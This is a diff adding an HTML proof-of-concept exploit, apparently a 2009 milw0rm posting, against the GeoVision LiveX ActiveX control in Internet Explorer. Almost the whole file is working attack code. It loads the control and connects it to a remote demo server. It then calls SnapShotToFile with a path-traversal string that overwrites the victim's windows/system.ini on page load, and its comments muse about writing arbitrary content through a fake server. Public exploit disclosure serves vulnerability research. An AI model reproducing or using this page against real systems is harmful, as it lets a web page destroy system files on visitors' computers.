@@ -1,0 +1,64 @@
+<!--
+GeoVision LiveX_v8200 ActiveX Control (LIVEX_~1.OCX) remote file corruption poc
+by Nine:Situations:Group::SnoopyAssault
+site: http://retrogod.altervista.org/
+
+working against IE8b/xpsp3, safe for scripting and for initialize.
+LiveX_v7000 with clsid {DA8484DE-52DB-4860-A986-61A8682E298A}
+LiveX_v8120 with clsid {F4421170-DB22-4551-BBFB-FFCFFB419F6F}
+have the same SnapShotToFile() and SnapShotX() methods
+
+this poc connects to a live demo server and replaces system.ini with jpeg content...
+could we set arbitrary content (???) ... maybe trough a fake server, checking ...
+-->
+<html>
+<head>
+<script language="JavaScript">
+function sleep(n)
+{
+    var now = new Date();
+    var exitTime = now.getTime() + (n*1000);
+    while (true) {
+        now = new Date();
+            if (now.getTime() > exitTime) return;
+    }
+}
+</script>
+</head>
+<body>
+	<object classid="clsid:8D58D690-6B71-4ee8-85AD-006DB0287BF1" id="WebCamX1" width="360" height="300">
+            <param name="IpAddress" value="http://24.248.47.203" ref> <!-- demo server -->
+            <param name="DisablePWD" value="-1">
+            <param name="UserName" value="wec">
+            <param name="Password" value="">
+          	<param name="CommandPort" value="4550">
+			<param name="DataPort" value="5550">
+			<param name="AudioDataPort" value="6550">
+			<param name="BandWidth" value="LAN">
+			<param name="FixSize" value="0">
+			<param name="FixWidth" value="320">
+			<param name="FixHeight" value="240">
+			<param name="SvrType" value="0">
+			<param name="AutoLogin" value="0">
+			<param name="DefaultCam" value="1">
+			<param name="AutoReConnect" value="-1">
+			<param name="MaxRetries" value="-1">
+			<param name="RetryInterval" value="70">
+          </object>
+<script language="JavaScript">
+  sleep(2);
+  //WebCamX1.SetCntDeviceType(0);
+  //WebCamX1.EnableAutoScreenSize(1);
+  //WebCamX1.SetInfo(125,1,0,"","");
+  //WebCamX1.SetInfo(129,1,0,"","");	
+  //WebCamX1.SetUpdateInfo(100, "WebCam", 0, "", 8200, 0,0);
+  //WebCamX1.DefaultCam = 1;
+  WebCamX1.PlayX();
+  sleep(2);
+  WebCamX1.SnapShotToFile("../../../../../../../../../../../windows/system.ini");
+  WebCamX1.SnapShotX();
+</script>    		
+</body>
+</html>
+
+# milw0rm.com [2009-02-16]
